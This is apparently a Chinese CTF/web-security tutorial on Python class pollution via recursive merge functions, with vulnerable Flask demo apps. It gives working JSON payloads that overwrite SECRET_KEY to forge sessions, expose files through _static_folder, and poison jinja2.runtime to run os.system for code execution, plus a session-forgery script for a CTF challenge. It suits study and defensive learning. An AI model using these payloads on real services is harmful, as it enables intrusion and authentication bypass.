---
title: 原型链污染
date: 2026-08-30 11:50:00
categories:
  - Web安全
tags:
  - 原型链污染
  - JavaScript
disableNunjucks: true
description: 原型链污染
---

## 1.Python原型链污染

Python原型链污染是一种通过修改对象原型链中的属性，导致程序行为偏离预期的攻击技术。其核心原理与JavaScript原型链污染类似，但实现方式因语言特性而有所差异。

- **原型继承特性**
  Python中每个对象通过`__class__`属性指向其所属类，类通过`__base__`属性指向父类。当访问对象属性时，若当前对象/类中未定义，会沿原型链向上查找14。
- **污染条件**
  需要存在递归合并函数（如`merge`）且未对特殊属性过滤

在 Python 中，每个对象都有一个原型链。当访问属性时，程序会先在对象本身查找，若找不到则沿着原型链向上查找。通过污染类的属性，可以影响所有实例的行为。

## 2.污染条件与污染分析：

原型链污染需要merge合并函数

例1：一个最简单的原型链污染：

```python
class Config:
    is_admin = False
    def set_config(cls, key, value):
        setattr(cls, key, value)
    def get_config(cls, key):
        return getattr(cls, key, None)
instance=Config()
print(instance.is_admin)     #False
//
setattr(instance,'is_admin','True')
print(instance.is_admin)     #True
```

刚初始化的instance里面的is_admin为false

经过setattr函数后is_admin变成了true，这个就是最简单的原型链污染

例2：利用merge的合并函数

```python
class father:
    secret = "hello"
class son_a(father):
    pass
class son_b(father):
    pass
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
            
//payload            
instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "world"
        }
    }
}
print(son_a.secret)
#hello
print(instance.secret)
#hello
merge(payload, instance)
print(son_a.secret)
#world
print(instance.secret)
#world
```

代码分析：

- `father.secret` 是一个**类属性**，被所有子类和实例共享
- 当访问 `son_a.secret` 或 `instance.secret` 时，Python会沿着继承链查找

属性查找路径：

```
实例(instance) → 子类(son_b) → 父类(father) →目标属性（object）
```

当我们访问 `instance.secret` 时：

1. 先在 `instance` 本身查找
2. 如果没有，在 `instance.__class__` (即 `son_b`) 中查找
3. 如果没有，在 `son_b.__base__` (即 `father`) 中查找
4. 以此类推...

污染原理分析:

为什么需要污染类而不是实例？

```python
# 错误的方法 - 只影响单个实例
instance.secret = "world"  # 在实例上创建新属性
print(son_a.secret)        # 仍然是 "hello" - 未污染

# 正确的方法 - 影响所有相关类和实例
father.secret = "world"    # 修改类属性
print(son_a.secret)        # "world" - 成功污染
```

`污染路径分析`：

在我们的代码中，污染路径是：

```bash
son_b → __base__ → father → secret
```

通过修改 `son_b.__base__.secret`，我们实际上修改了：

- `father.secret` 本身
- 所有继承自 `father` 的类 (`son_a`, `son_b`)
- 这些类的所有实例（包括已创建和将来创建的）

## 3.关键利用点

#### **全局变量污染**：

在函数或类方法中，我们经常会看到`__init__`初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性`__globals__`属性，`__globals__` 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间。具体来说就是，`__globals__` 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。

通过 *__globals__* 属性，可以修改函数或类方法的全局变量。例如：

```python
a = 1
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
def demo():
    pass
class A:
    def __init__(self):
        pass
class B:
    classa = 2
    
//通过merge加上globals来获得对应的全局变量
instance = A()
payload = {
    "__init__":{
        "__globals__":{
            "a":4,
            "B":{
                "classa":5
            }
        }
    }
}
print(B.a)
print(a)

merge(payload, instance)
print(B.a)
print(a)
```

#### **模块污染**：

在全局变量的前提下，是我们都在入口文件中的类对象或者属性来进行操作的，但是如果我们操作的位置在入口文件中，而目标对象并不在入口文件当中，这时候我们就需要对其他加载过的模块来获取了。

##### 1.import加载获取：**直接导入**：`__init__.__globals__["module"]`

在简单的关系情况下，我们可以直接通过import来进行加载，在payload中我们只需要对对应的模块重新定位就可以：

```python
import demo
payload = {
    "__init__":{
        "__globals__":{
            "demo":{
                "a":4,
                "B":{
                    "classa":5
                }
            }
        }
    }
}
##demo.py
a = 1
class B:
    classa = 2
```

##### 2.sys模块加载获取：__init__.__globals__["sys"].modules

在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块：

同样是刚才的情景，因为我们已经加载过demo.py了，所以我们用sys来对里面的目标进行获取,但是存在一个问题就是，我们的payload传参的时候大概率是在它源码已有的基础上进行传参，很有可能源码中没有引入。

```python
import sys
payload = {
    "__init__":{
        "__globals__":{
            "sys":{
                "modules":{
                    "demo":{
                        "a":4,
                        "B":{
                            "classa":5
                        }
                    }
                }
            }
        }
    }
}
```

##### 3.加载器loader获取：__loader__` 或 `__spec__

loader加载器在python中的作用是为实现模块加载而设计的类，其在`importlib`这一内置模块中有具体实现。而`importlib`模块下所有的`py`文件中均引入了`sys`模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过`loader.__init__.__globals__['sys']`来获取到sys模块，然后再获取到我们想要的模块。那么我们现在的目标就变成了获取loader：

1.在Python中，`__loader__`是一个内置的属性，包含了加载模块的loader对象，Loader对象负责创建模块对象，通过`__loader__`属性，我们可以获取到加载特定模块的loader对象。

```python
import math
# 获取模块的loader
loader = math.__loader__
# 打印loader信息
print(loader)
```

在这个例子当中我们就能够明白，math模块的`__loader__`属性包含了一个loader对象，负责加载math模块

2.在python中还存在一个`__spec__`，包含了关于类加载时候的信息，他定义在`Lib/importlib/_bootstrap.py`的类`ModuleSpec`，所以可以直接采用`<模块名>.__spec__.__init__.__globals__['sys']`获取到`sys`模块。

#### 函数形参默认值替换：

- `__defaults__` 修改默认参数
- `__kwdefaults__` 修改关键字参数

1.在Python中，`__defaults__`是一个元组，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在`__defaults__`元组中。

```python
def a(var_1, var_2 =2, var_3 = 3):
    pass
print(a.__defaults__)
#(2, 3)
```

所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：

```python
payload = {
    "__init__" : {
        "__globals__" : {
            "demo" : {
                "__defaults__" : (True,)
            }
        }
    }
}
```

2.`__kwdefaults__`是以字典形式来进行收录：

```python
payload = {
    "__init__" : {
        "__globals__" : {
            "demo" : {
                "__kwdefaults__" : {
                    "shell" : True
                }
            }
        }
    }
}
```

#### 特定值替换：

##### flask密钥替换：`SECRET_KEY` 伪造session

（例1）

如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为`secret_key`是在当前入口文件下面的，所以我们可以直接通过`__init__.__globals__`获取全局变量，然后通过`app.config["SECRET_KEY"]`来进行污染：

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "[+]Config:%s"%(app.config['SECRET_KEY'])

app.run(host="0.0.0.0")
```

这里我们并无法确定secretkey是什么，所以如果能够污染我们就可以实现任意的session伪造

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                "config" : {
                    "SECRET_KEY" :"Polluted~"
                }
            }
        }
    }
}
```

#####  `_got_first_request`重置触发初始化

用于判定是否某次请求为自 Flask 启动后第一次请求，是 `Flask.got_first_request` 函数的返回值，此外还会影响装饰器 `app.before_first_request` 的调用，依据源码可以知道`_got_first_request` 值为假时才会调用

示范环境如下：

```python
from flask import Flask,request
import json
 
app = Flask(__name__)
 
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
 
class cls():
    def __init__(self):
        pass
 
instance = cls()
 
flag = "Is flag here?"
 
@app.before_first_request
def init():
    global flag
    if hasattr(app, "special") and app.special == "U_Polluted_It":
        flag = open("flag", "rt").read()
 
@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    global flag
    setattr(app, "special", "U_Polluted_It")
    return flag
 
app.run(host="0.0.0.0")
#flag
 
flag{U_Find_Me}
```

`before_first_request` 修饰的 `init` 函数只会在第一次访问前被调用，而其中读取 flag 的逻辑又需要访问路由 `/` 后才能触发，这就构成了矛盾。
所以需要使用 payload 在访问 `/` 后重置`_got_first_request` 属性值为假，这样 `before_first_request` 才会再次调用。

所以，直接访问没有 flag
携带 Payload 重置`_got_first_request` 属性值为假

```python
{
    "__init__":{
        "__globals__":{
            "app":{
                "_got_first_request":false
            }
        }
    }
}
```

`init` 函数被触发，且其中读取 flag 的相关逻辑被执行，这样就获得了 flag

##### `_static_url_path`目录穿越读取文件

这个属性中存放的是 flask 中静态目录的值，默认该值为 `static`。访问 flask 下的资源可以采用如 `http://domain/static/xxx`，这样实际上就相当于访问`_static_url_path` 目录下 xxx 的文件并将该文件内容作为响应内容返回

```python
#static/index.html
 
<html>
<h1>hello</h1>
<body>    
</body>
</html>
#app.py
 
from flask import Flask,request
import json
 
app = Flask(__name__)
 
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
 
class cls():
    def __init__(self):
        pass
 
instance = cls()
 
@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "flag in ./flag but heres only static/index.html"
 
app.run(host="0.0.0.0")
#flag
 
flag{U_Find_Me}
```

此时 `http://domain/static/xxx` 只能访问到文件系统当前目录下 `static` 目录中的 `xxx` 文件，并且不存在如目录穿越的漏洞 (`http://domain/static/../flag` 会报错)

使用如下 payload 污染该属性为当前目录。

```python
{
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

这样就能通过 `/static/flag` 访问到当前目录下的 flag 文件了

#### Jinja 语法标识符（语法标识符替换绕过过滤）

在默认的规则规则下，常用 Jinja 语法标识符有 `{{ Code }}`、`{% Code %}`、`{# Code #}`，当然对于我们需要 RCE 的需求来说，通常前两者才需要留意。
而 Flask 官方文档中明确告知了，这些语法标识符均是可以依照 Jinja 中修改的
在 Jinja 文档中展示了对这些语法标识符进行替换的方法：[API — Jinja Documentation (3.1.x) (palletsprojects.com)](https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment)，即对 Jinja 的环境类的相关属性赋值

而在 Flask 中使用了 Flask 类（`Lib/site-packages/flask/app.py`）的装饰器装饰后的 `jinja_env` 方法实现上述的功能；

![img](http://jarenl.com/wp-content/uploads/2024/11/65abb7f0-b8f1-4073-9598-b86ee4a4e079.png)

经过装饰器的装饰后，简单来说可以将该方法视为属性，对该方法的获取就能实现方法调用，类似 `Flask.jinja_env` 就相当于 `Flask.jinja_env()`

![img](http://jarenl.com/wp-content/uploads/2024/11/b1af8ddb-45ee-4d07-8d09-61168774f6aa.png)

<img src="http://jarenl.com/wp-content/uploads/2024/11/d8e6dd5a-8bad-4377-bb86-396cd5842127.png" alt="img" style="zoom:150%;" />

跟进其中调用的 `create_jinja_environment`，结合注释就可以发现 `jinja_env` 方法返回值就是 Jinja 中的环境类（实际上是对原生的 Jinja 环境类做了继承，不过在使用上并无多大区别），所以我们可以直接采用类似 `Flask.jinja_env.variable_start_string = "xxx"` 来实现对 Jinja 语法标识符进行替换

模拟的环境如下：

```python
#templates/index.html
 
<html>
<h1>Look this -> [[flag]] <- try to make it become the real flag</h1>
<body>    
</body>
</html>
#app.py
 
from flask import Flask,request,render_template
import json
 
app = Flask(__name__)
 
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
 
class cls():
    def __init__(self):
        pass
 
instance = cls()
 
@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "go check /index before merge it"
 
@app.route('/index',methods=['POST', 'GET'])
def templates():
    return render_template("test.html", flag = open("flag", "rt").read())
 
app.run(host="0.0.0.0")
#flag
 
flag{U_Find_Me}
```

访问 index 路由会给模板填充 flag 变量的值，但是需要应该要语法标识符是 `{{flag}}`，但这里是 `[[flag]]` 是无法被解析的

这里按照上面所述，修改相应的语法标识符：

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                    "jinja_env" :{
                        "variable_start_string" : "[[","variable_end_string":"]]"
                  }
            }
        }
    }
}
```

这样就成功了吗？并没有，访问 index 路由会发现 flag 值还是没有被填充进来，也就是语法标识符没有被解析

为什么呢？这里先给出结论，Flask 默认会对一定数量内的模板文件编译渲染后进行缓存，下次访问时若有缓存则会优先渲染缓存，所以输入 payload 污染之后虽然语法标识符被替换了，但渲染的内容还是按照污染前语生成的缓存，由于缓存编译时并没有存在 flag 变量，所以自然没有被填充 flag。

所以只需我们在 Flask 服务启动后（当然这里演示就是重启下 Flask 服务就行了，对于题目来说一般就是重启容器，或是在污染之后再访问模板）先输入 payload 再访问 index 路由即可

#### Jinja 语法全局数据（全局变量注入）

实际上包括函数、变量、过滤器这三者都能被自定义的添加到 Jinja 语法解析时的环境，操作方式于 Jinja 语法标识符中完全类似
这里以增加变量为例子给出模拟的环境如下：

```python
#templates/index.html
 
<html>
<h1>{{flag if permission else "No way!"}}</h1>
<body>    
</body>
</html>
#app.py
 
from flask import Flask,request,render_template
import json
 
app = Flask(__name__)
 
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
 
class cls():
    def __init__(self):
        pass
 
instance = cls()
 
@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return render_template("index.html", flag = open("flag", "rt").read())
 
app.run(host="0.0.0.0")
```

直接访问会由于没有设定 `permission` 值导致 `if` 条件为假返回 `No way!` 而不是 `flag`
所以将其赋值为任意逻辑非空值让条件为真即可

```python
{
    "__init__":{
        "__globals__":{
            "app":{
                "jinja_env":{
                    "globals":{
                        “permission":true
                    }
                }
            }
        }
    }
}
```

#### 模板编译时的变量（runtime模块污染实现RCE）

在 flask 中如使用 `render_template` 渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的 Jinja 语法进行解析转化为 AST，而在语法树的根部即 `Lib/site-packages/jinja2/compiler.py` 中 `CodeGenerator` 类的 `visit_Template` 方法纯在一段有趣的逻辑

![img](http://jarenl.com/wp-content/uploads/2024/11/d0ca1c4c-ca76-41e3-b982-625dde1a9124.png)

该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的 `exported_names` 变量，该变量为`.runtime` 模块（即 `Lib/site-packages/jinja2/runtime.py`）中导入的变量 `exported` 和 `async_exported` 组合后得到，这就意味着我们可以通过污染`.runtime` 模块中这两个变量实现 RCE。
由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现 RCE。

环境如下：

```python
#templates/index.html
 
<html>
<h1>nt here~</h1>
<body>    
</body>
</html>
#app.py
 
from flask import Flask,request,render_template
import json
 
app = Flask(__name__)
 
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
 
class cls():
    def __init__(self):
        pass
 
instance = cls()
 
@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return render_template("index.html")
 
app.run(host="0.0.0.0")
#static/
#是个空目录,方便直接利用static目录读取flag
#flag
 
flag{U_Find_Me}
```

进行 RCE 将 flag 写入 `static` 目录中

```python
{
    "__init__":{
        "__globals__":{
            "__loader__":{
                "__init__":{
                    "__globals__":{
                        "sys":{
                            "modules":{
                                "jinja2":{
                                    "runtime":{
                                        "exported":[
                                            "*;__import__('os').system('cp ./flag ./static/flag')
                                            ;#"
                                        ]
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

但是需要注意插入 payload 的位置是 AST 的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的 payload 只会在模板在第一次访问时触发
然后就能在 static 目录下读取到 flag 了 `/static/flag`

## 4.练习题

### **极客大挑战ez_inject**

相关考点：`flask原型链污染`

<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20251019120003924.png" alt="image-20251019120003924" style="zoom: 50%;" />

<img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20251019121324007.png" alt="image-20251019121324007" style="zoom:50%;" />

解码后的数据: {'is_admin': 0, 'username': '2'}

所以需要伪造session成为管理员，这时候就需要我们污染`secret_key`

```Python
import requests
import json

url = "https://URL/register"
payload = {
    "username": "123",
    "password": "123",
    "__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "baozongwi"}}}},
}
r = requests.post(url=url, json=payload)
print(r.text)
```

成功之后，登录，然后改session

```Python
flask-unsign --sign --cookie "{'is_admin': 1, 'username': '123'}" --secret  'baozongwi'  
编码：eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJ0ZXN0In0.Zx22cA.SJsCGBAno33UFkFLzNXJJdDjbS
```

换了session之后看到secret

### **极客大挑战2024-py_game**

bp抓包获取session，解码获得秘钥

![image-20251019213036808](/img/ctf/prototype-pollution-004.png)

利用秘钥改session



# 常见的递归合并函数名

### 1. 直接相关的函数名

python

```
# 常见的合并函数命名
merge()
deep_merge()
recursive_merge()
update()
deep_update()
merge_dicts()
combine()
deep_combine()
```

### 2. 配置/设置相关的函数

python

```
# 配置合并场景
update_config()
merge_config()
load_config()
setup()
configure()
```

### 3. 数据处理相关

python

```
# 数据处理场景
merge_data()
update_data()
patch()
deep_patch()
```

### 4. 对象操作相关

python

```
# 对象操作场景
update_attributes()
assign_properties()
extend()
deep_extend()
```



